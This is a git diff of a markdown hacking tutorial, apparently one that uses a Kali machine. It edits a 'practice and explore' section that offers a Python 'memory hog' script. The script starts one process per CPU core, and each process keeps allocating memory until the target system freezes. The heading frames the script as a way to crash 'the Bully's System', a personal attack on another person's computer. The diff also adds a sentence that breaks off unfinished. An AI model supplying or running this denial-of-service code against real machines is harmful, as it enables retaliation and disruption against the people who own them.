@@ -218,23 +218,24 @@ Actually go back to the Kali machine to see if you received a notification
 
 ---
 # Part 5: practice and explore
-
+    
+Use the following scripts to 
 Memory Hog (Consumes RAM Until the Bully’s System Freezes)
 
 ``` python
-#!/usr/bin/env python3
-import multiprocessing
-import time
-
-def memory_hog():
-    """Consumes system memory indefinitely."""
-    data = []
-    while True:
-        data.append("X" * 10**6)  # Allocate 1MB per loop
-        time.sleep(0.5)
-
-if __name__ == "__main__":
-    for _ in range(multiprocessing.cpu_count()):
-        p = multiprocessing.Process(target=memory_hog)
-        p.start()
+#!/usr/bin/env python3    
+import multiprocessing    
+import time    
+    
+def memory_hog():    
+    """Consumes system me mory indefinitely."""    
+    data = []    
+    while True:    
+        data.append("X" * 10**6)  # Allocate 1MB per loop    
+        time.sleep(0.5)    
+    
+if __name__ == "__main__":    
+    for _ in range(multiprocessing.cpu_count()):    
+        p = multiprocessing.Process(target=memory_hog)    
+        p.start()    
 ```
